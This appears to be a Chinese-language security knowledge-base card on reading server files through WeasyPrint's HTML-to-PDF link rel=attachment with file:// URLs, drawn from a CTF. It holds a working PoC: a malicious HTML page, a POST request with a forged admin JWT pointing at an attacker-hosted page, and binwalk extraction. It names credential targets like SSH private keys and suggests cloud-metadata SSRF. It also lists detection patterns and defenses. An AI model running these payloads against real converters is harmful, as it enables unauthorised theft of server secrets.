---
id: web-generic-ssrf-weasyprint-attachment-file-read
title: WeasyPrint HTML 转 PDF：link rel=attachment 的 file:// 读取本地文件并嵌入 PDF
type: scenario
domain: web
path: web/generic/ssrf
technique: weasyprint-attachment-file-read
aliases:
- WeasyPrint 任意文件读取
- WeasyPrint LFI
- HTML 转 PDF 本地文件读取
- link rel=attachment file 协议
- flask-weasyprint 文件读取
- PDF 附件读文件
tags:
- ssrf
- lfi
- file-read
- weasyprint
- pdf
- html-converter
- python
- flask
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V604
  verified_at: '2026-11-12T18:33:51+08:00'
  notes: 已对照原文与20图核对：图06 官方文档明确 file:// 可访问本地文件并以 img/embed 嵌入；图07 _write_pdf_attachment 将 link 转 Attachment(url=...,url_fetcher=...) 并 with attachment.source 读取；图08 ensure_url 对非绝对URL走 path2url；图10 恶意HTML为 <link rel=attachment href="file:///flag">；图11/12 经 flask-weasyprint HTML(url=url).write_pdf() 生成PDF后 binwalk -e，cat 102 得到 flag{welcome_AsaLin_dalao}。入口 POST url= 与源码一致，JWT verify_signature False 为关联卡的独立缺陷。affected_versions 留空正确：原文无组件版本。dedup 报告判 new，related 候选中 wkhtmltopdf 为JS本地上下文、pd4ml 为Java专有标签、TCPDF/jsPDF 为不同sink，非同一条链，保留。未验证点：未实际部署 WeasyPrint 复现。
---

## 一句话结论

WeasyPrint 把 HTML/CSS 渲染为 PDF 时，按设计支持通过 URL 抓取资源，且 `<link rel="attachment" href="...">` 会把外部资源作为 PDF 附件嵌入；当服务端用攻击者可控的 HTML 生成 PDF 且未禁用 `file://` 时，`href="file:///flag"` 会让渲染进程读取本地文件并写入 PDF，下载后提取附件即可拿到文件内容。

## 原理

- **HTML 转 PDF 引擎的资源抓取**：WeasyPrint 渲染时会为 `img`、`embed`、`link` 等元素解析 URL 并读取资源。官方文档明确提示：对不可信 HTML/CSS 使用 WeasyPrint 时，`file://` URI 可访问服务器本地文件系统，并把文件内容嵌入生成的文档（例如 `img`/`embed` 标签）。
- **attachment 语义**：`<link rel="attachment" href="URL">` 表示把 URL 指向的资源作为 PDF 附件嵌入。WeasyPrint 在 `_write_pdf_attachment` 中把该 link 转成 `Attachment(url=..., url_fetcher=...)`，再通过 `attachment.source` 打开并读取资源；相对路径经 `ensure_url`/`path2url` 会转成 `file://` URL。因此 `href` 使用绝对 `file://` 时，读取目标完全由攻击者指定。
- **为什么能读任意文件**：URL fetcher 默认未限制协议与路径；`file:///flag`、`file:///etc/passwd`、`file:///root/.ssh/id_rsa` 都会以渲染进程身份被打开，内容作为附件流写入 PDF。
- **外带通道**：生成的 PDF 由接口直接返回下载；用 `binwalk -e output.pdf` 或 PDF 解析工具提取内嵌附件（如 `102`、`340` 等流文件），即可读到原文件内容。
- **入口条件**：应用把用户提交的 URL/HTML 交给 `HTML(url=url).write_pdf()`（如 flask-weasyprint 的 `render_pdf`），且攻击者能通过鉴权（本例还存在 JWT `verify_signature: False` 的独立缺陷，可伪造 admin，见关联卡）。

## 触发条件

- 服务端使用 WeasyPrint（或同类 HTML→PDF 引擎）把不可信 HTML/CSS/URL 渲染为 PDF。
- 渲染进程允许 `file://` 协议（默认允许，除非自定义 URL fetcher/沙箱限制）。
- 生成的 PDF 可被攻击者下载或读取。
- 渲染进程对目标文件有读权限（以 Web 服务账号身份）。

## 利用步骤

1. 找到 HTML→PDF 接口（上传 HTML、提交 URL、模板预览等），确认返回 `application/pdf`。
2. 在自己控制的站点/服务器放置一个 HTML，内容使用 `<link rel="attachment" href="file:///flag">`；也可先试 `img`/`embed` 标签确认哪些生效。
3. 把该 HTML 的 URL 提交给接口，等待生成 PDF 并下载。
4. 用 `binwalk -e output.pdf` 分离，或在 PDF 中查看附件；`cat` 分离出的流文件即得到 flag/文件内容。
5. 若接口只接受 HTML 文本，直接把恶意 HTML 作为输入提交；若禁用了 `link`，尝试 `img`/`embed` 的 `file://`。
6. 读配置、私钥等敏感文件，或把 `file://` 换成 `http://` 打内网/云元数据（视 URL fetcher 是否允许）。

## PoC

恶意 HTML：

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title></title>
</head>
<body>
  <link rel="attachment" href="file:///flag">
</body>
</html>
```

提交 URL 生成 PDF：

```http
POST / HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Cookie: access_token=<伪造的 admin JWT>

url=http://<attacker>/evil.html
```

提取 PDF 中的附件：

```bash
binwalk -e output.pdf
cd _output.pdf.extracted
cat 102        # 内容即 file:///flag 指向的文件
```

## 变体与关联

- **变体（标签）**：`<link rel=attachment>` 最直接；`<img src="file:///...">`、`<embed src="file:///...">` 在允许时会把内容渲染进页面；CSS `url(file://...)`、`@font-face` 也可尝试。
- **变体（引擎）**：pd4ml 的 `<pd4ml:attachment src=file://...>`、wkhtmltopdf 的 `<iframe src=file://...>`、DOCX→PDF 转换器的 `<img src>` 属同一“文档转换器 LFI”家族。
- **变体（利用面）**：`file://` 读文件；`http://` 做内网 SSRF/云元数据；特殊文件（如 `/dev/random`）可造成渲染阻塞（DoS，不属本卡）。
- **关联**：[[web-generic-ssrf-pd4ml-attachment-file-read-dynamodb-poison]]（pd4ml attachment file:// 任意文件读取）、[[web-generic-ssrf-docx-converter-image-local-file-read]]（DOCX 转换器 img 本地文件读取）、[[web-generic-jwt-unverified-signature-payload-tamper]]（本例入口的 JWT 不验签缺陷）。
- **边界**：自定义 URL fetcher 只允许 http/https 且校验内网地址、渲染进程被 sandbox/chroot 限制、或生成 PDF 不返回给用户时，利用不成立。

## 检测与防御

- **禁用 file 协议**：为 WeasyPrint 配置自定义 URL fetcher，只允许 http/https 并校验目标地址，禁止 `file://`、`data:` 等协议；或使用官方推荐的沙箱方案限制进程文件访问。
- **不渲染不可信 HTML**：把待转 PDF 的 HTML 模板写死，用户输入只作为转义后的数据字段；禁止直接渲染用户提交的 URL/HTML。
- **最小权限**：渲染进程使用低权限账号，禁止读取敏感目录；容器内运行并限制挂载。
- **检测**：HTML 中出现 `file://`、`link rel=attachment`、`embed`、`img src=file`；渲染进程异常打开 `/etc/passwd`、`/flag`、`.ssh` 等路径；PDF 附件数量/体积异常。
